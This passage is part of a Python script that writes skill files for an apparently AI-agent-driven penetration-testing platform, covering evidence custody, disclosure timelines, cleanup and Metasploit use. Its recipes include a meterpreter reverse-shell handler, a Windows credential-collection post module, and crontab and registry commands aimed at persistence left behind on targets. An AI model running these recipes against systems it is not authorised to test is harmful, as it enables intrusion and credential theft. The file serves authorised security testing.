        "overview": "Evidence chain of custody — 5-layer chain (Detection, Validation, Exploitation, Post-Exploitation, Audit) + HMAC-SHA256 tamper seals per evidence row.",
        "when_to_use": "Whenever evidence is captured. Loaded by reporting-remediation agent (also used implicitly by destructive agents).",
        "methodology": [
            "1. Capture evidence at each layer (detection → validation → exploitation → post-exploit → audit)",
            "2. Each evidence row gets HMAC-SHA256 tamper seal (custody_seal field)",
            "3. Calculate evidence_hash (SHA-256 of raw_output)",
            "4. Custody verifier runs on every Evidence read",
            "5. PII redaction BEFORE storage (app/pii/redactor.py)",
            "6. Quarantine dangerous output (raw shell output, command output)",
        ],
        "tool_recipes": [
            "Evidence.add_evidence(finding_id, layer='detection', raw_output=redacted_output, tool_used='nmap')",
            "CustodyVerifier.verify_evidence(evidence_id)",
            "CustodyVerifier.verify_finding_chain(finding_id)",
        ],
        "output_standards": "Evidence row format: finding_id, layer (one of 5), raw_output (PII redacted), tool_used, captured_at, custody_seal (HMAC), evidence_hash (SHA-256). Tamper detection on every read.",
    },
    {
        "name": "disclosure-workflow",
        "description": "ISO 29147 disclosure timeline management",
        "version": "1.0.0",
        "tags": ["disclosure", "iso-29147", "timeline"],
        "triggers": ["disclosure", "iso 29147", "timeline"],
        "allowed_tools": "",
        "agents": ["reporting-remediation"],
        "overview": "ISO 29147 vulnerability disclosure timeline management — per-severity windows (Critical 7d, High 30d, Medium 90d, Low 180d) + notification emails + retest flow.",
        "when_to_use": "At finding creation + on retest. Loaded by reporting-remediation agent.",
        "methodology": [
            "1. On finding creation: auto-start disclosure timer per severity",
            "2. Severity windows: Critical 7d, High 30d, Medium 90d, Low 180d",
            "3. Notify user X days before window expires (email)",
            "4. On retest request: re-run PoC, update finding status",
            "5. Status flow: pending → scheduled → running → verified / still_vulnerable / fixed",
            "6. After fix verified: close finding + log audit entry",
        ],
        "tool_recipes": [
            "POST /api/findings/{id}/retest (W22 — retest endpoint)",
            "app/core/disclosure.py (W22 — disclosure module)",
        ],
        "output_standards": "Each finding: disclosed_at, expires_at, notified (bool), retest_status. Email notifications sent via aiosmtplib. ISO 29147 compliance.",
    },
    {
        "name": "cleanup-rollback-procedures",
        "description": "Post-scan cleanup script + verification checklist",
        "version": "1.0.0",
        "tags": ["cleanup", "rollback", "post-scan"],
        "triggers": ["cleanup", "rollback", "post-scan"],
        "allowed_tools": "",
        "agents": ["cleanup-rollback"],
        "overview": "Post-scan cleanup procedures — runs scripts/cleanup_scan.sh + verifies no persistence left behind + produces cleanup verification report.",
        "when_to_use": "At scan completion (always). Loaded by cleanup-rollback agent.",
        "methodology": [
            "1. Run scripts/cleanup_scan.sh (removes /tmp/sqlmap-*, ~/.msf6/loot/, ~/.msf6/logs/)",
            "2. Verify no persistence left (check cron, systemd, registry Run keys)",
            "3. Remove any uploaded webshells",
            "4. Remove any beacon payloads (c2_payloads/ dir)",
            "5. Document cleanup actions in audit log",
            "6. Produce cleanup verification report for evidence chain",
        ],
        "tool_recipes": [
            "scripts/cleanup_scan.sh scan_<id>",
            "crontab -l | grep -v 'beacon\\|reverse' | crontab -",
            "reg delete 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v Update /f",
        ],
        "output_standards": "Cleanup report: list of removed artifacts, list of checked persistence mechanisms (all clean), audit log entries, timestamp. Each cleanup action recorded as PentestFact (cleanup_action).",
    },
    {
        "name": "metasploit-integration",
        "description": "msfrpcd integration + module selection guide",
        "version": "1.0.0",
        "tags": ["metasploit", "msf", "msfrpcd"],
        "triggers": ["metasploit", "msf", "msfrpcd"],
        "allowed_tools": "metasploit",
        "agents": ["penetration", "privilege-escalation", "lateral-movement"],
        "overview": "Metasploit RPC integration guide — module selection (exploits/auxiliary/post), session management, post-exploitation modules. Uses app/exploit/metasploit_client.py (msgpack RPC client → msfrpcd at 127.0.0.1:55553).",
        "when_to_use": "When Metasploit exploitation is required (HITL approved). Loaded by penetration, privilege-escalation, lateral-movement agents.",
        "methodology": [
            "1. Start msfrpcd as direct process: msfrpcd -P <password> -U msfuser -p 55553 -a 127.0.0.1 -S",
            "2. Connect via app/exploit/metasploit_client.py (msgpack RPC)",
            "3. Module discovery (list exploit/auxiliary/post modules, cache results)",
            "4. Select module based on target (e.g. exploit/multi/handler for reverse shell)",
            "5. Configure module options (RHOSTS, LHOST, LPORT, PAYLOAD)",
            "6. Execute exploit (HITL approval required — D25)",
            "7. Session management (sync to C2Session table — D28 unified C2)",
            "8. Post-exploitation: run post modules on sessions",
        ],
        "tool_recipes": [
            "app/exploit/metasploit_client.py: MetasploitClient(host='127.0.0.1', port=55553, user='msfuser', password=...)",
            "client.execute_exploit('exploit/multi/handler', {'LHOST': '0.0.0.0', 'LPORT': 4444, 'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp'})",
            "client.run_post_module('post/windows/gather/credentials/credential_collector', session_id=1)",
        ],
        "output_standards": "Each MSF execution: module name, options used (redacted password), session ID created (sync to C2Session), MITRE ATT&CK technique, HITL approval ID. Sync all sessions to C2Session table for unified C2 dashboard.",
    },
]


# ---------- Template ----------

TEMPLATE = """\
---
name: {name}
description: {description}
license: apache-2.0
compatibility: ">=3.2"
metadata:
  version: "{version}"
  tags: {tags_yaml}
  triggers: {triggers_yaml}
allowed-tools: "{allowed_tools}"
mapped-agents: {agents_yaml}
---

# {name}

## Overview

{overview}

## When to Use

{when_to_use}

**Mapped agents**: {agents_str}

## Methodology

{methodology_md}

## Tool Recipes

{tool_recipes_md}

## Output Standards

{output_standards}

## VAPT-AI Specific Notes

- This skill follows the agentskills.io specification (same as CyberStrikeAI).
- Loaded by SkillLoader (app/skills/loader.py) on first access.
- Auto-loaded by mapped agents via BaseAgent.__init__() (W11-S5).
- Skill content available via `GET /api/orchestration/skills/{name}` (W11-S6).
- D18 guardrails apply: skills do NOT bypass tool allowlist enforcement.
- HITL approval still required for destructive operations (skill content is advisory).
"""


# ---------- Render helpers ----------

def to_yaml_list(items: list[str]) -> str:
    if not items:
        return "[]"
    return "[" + ", ".join(f'"{i}"' for i in items) + "]"


def to_md_bullets(items: list[str]) -> str:
    return "\n".join(f"- {item}" for item in items)


def to_md_code_blocks(items: list[str]) -> str:
    return "\n".join(f"```bash\n{item}\n```" for item in items)


def to_skill_dir(name: str) -> str:
    """Skill directory name = skill name (already kebab-case)."""
    return name


# ---------- Main ----------

def main() -> int:
    SKILLS_DIR.mkdir(parents=True, exist_ok=True)

    generated = []
    for skill in SKILLS:
        skill_dir = SKILLS_DIR / to_skill_dir(skill["name"])
        skill_dir.mkdir(parents=True, exist_ok=True)

        content = TEMPLATE.format(
            name=skill["name"],
            description=skill["description"],
            version=skill["version"],
            tags_yaml=to_yaml_list(skill["tags"]),
            triggers_yaml=to_yaml_list(skill["triggers"]),
            allowed_tools=skill["allowed_tools"],
            agents_yaml=to_yaml_list(skill["agents"]),
            overview=skill["overview"],
            when_to_use=skill["when_to_use"],
            agents_str=", ".join(skill["agents"]),
            methodology_md=to_md_bullets(skill["methodology"]),
            tool_recipes_md=to_md_code_blocks(skill["tool_recipes"]),
            output_standards=skill["output_standards"],
        )

        skill_md_path = skill_dir / "SKILL.md"
        skill_md_path.write_text(content, encoding="utf-8")
        generated.append((skill["name"], len(content), skill_md_path))

    print(f"Generated {len(generated)} skill packages:")
    for skill_name, size, path in generated:
        rel = path.relative_to(PROJECT_ROOT)
        print(f"  {skill_name:35s}  {size:5d} bytes  {rel}")

    print(f"\nTotal skills: {len(generated)}")
    print(f"Skills directory: {SKILLS_DIR.relative_to(PROJECT_ROOT)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())